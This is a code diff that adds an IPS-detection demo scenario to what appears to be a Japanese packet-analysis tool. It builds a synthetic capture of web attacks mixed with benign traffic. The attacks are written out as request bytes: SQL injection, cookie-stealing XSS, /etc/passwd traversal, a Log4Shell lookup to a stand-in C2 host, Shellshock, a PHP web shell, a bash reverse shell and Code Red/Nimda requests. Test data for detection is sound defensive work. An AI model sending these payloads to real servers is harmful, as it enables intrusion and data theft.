@@ -40,6 +40,7 @@ SCENARIOS = {
     "sir":           "📡 富士通 Si-R（回線断・エラーコード）",
     "session_id_demo": "🔑 セッションID使い回し（乗っ取り疑い）",
     "ctf_challenge": "🚩 CTF練習問題（パケットフォレンジック）",
+    "ips_attack": "🛡️ Web攻撃/侵入試行（IPSシグネチャ検知）",
 }
 
 # ─── サンプル IP ───────────────────────────────────────────────────
@@ -830,6 +831,46 @@ def _pcap_ctf_challenge() -> bytes:
     return _write_pcap(pkts)
 
 
+def _pcap_ips_attack() -> bytes:
+    """
+    IPSシグネチャ検知のデモ。Catalyst等でミラー取得したパケットに
+    見立てて、代表的なWeb攻撃・侵入試行をHTTPリクエストとして流す。
+    """
+    pkts = []
+    t = time.time() - 60
+    attacker = "203.0.113.66"
+    web = "192.168.10.80"
+
+    _attacks = [
+        b"GET /login.php?user=admin'%20OR%201=1--%20 HTTP/1.1\r\nHost: web\r\n\r\n",
+        b"GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1\r\nHost: web\r\n\r\n",
+        b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: web\r\n\r\n",
+        b"GET / HTTP/1.1\r\nHost: web\r\nUser-Agent: ${jndi:ldap://evil-c2.example/x}\r\n\r\n",
+        b"GET /cgi-bin/status HTTP/1.1\r\nHost: web\r\nUser-Agent: () { :; }; /bin/bash -c 'id'\r\n\r\n",
+        b"POST /upload.php HTTP/1.1\r\nHost: web\r\n\r\n<?php system($_GET['cmd']); ?>",
+        b"GET /admin HTTP/1.1\r\nHost: web\r\nUser-Agent: sqlmap/1.7.2\r\n\r\n",
+        b"GET /.env HTTP/1.1\r\nHost: web\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
+        b"POST /shell HTTP/1.1\r\nHost: web\r\n\r\ncmd=/bin/bash -i >& /dev/tcp/203.0.113.66/4444 0>&1",
+        b"GET /default.ida?" + b"N" * 240 + b"%u9090%u6858%ucbd3 HTTP/1.0\r\n\r\n",  # Code Red
+        b"GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n",   # Nimda
+    ]
+    _sport = 40000
+    for _atk in _attacks:
+        pkts.append((t, _ip_tcp(attacker, web, _sport, 80,
+                                 dpkt.tcp.TH_PUSH | dpkt.tcp.TH_ACK, seq=1, data=_atk)))
+        _sport += 1
+        t += 0.5
+
+    # 正常な通信も混ぜる（誤検知しないことの確認用）
+    for i in range(3):
+        pkts.append((t, _ip_tcp("192.168.10.20", web, 50000 + i, 80,
+                                 dpkt.tcp.TH_PUSH | dpkt.tcp.TH_ACK, seq=1,
+                                 data=b"GET /index.html HTTP/1.1\r\nHost: web\r\nUser-Agent: Mozilla/5.0\r\n\r\n")))
+        t += 0.3
+
+    return _write_pcap(pkts)
+
+
 def _pcap_showcase() -> bytes:
     """
     パケット解析タブの全機能を一度に試せる総合サンプル。
@@ -984,6 +1025,7 @@ def run_scenario(scenario: str) -> dict:
         "sir":            _pcap_normal,
         "session_id_demo": _pcap_session_id_demo,
         "ctf_challenge":   _pcap_ctf_challenge,
+        "ips_attack":      _pcap_ips_attack,
     }.get(scenario, _pcap_normal)
 
     try:
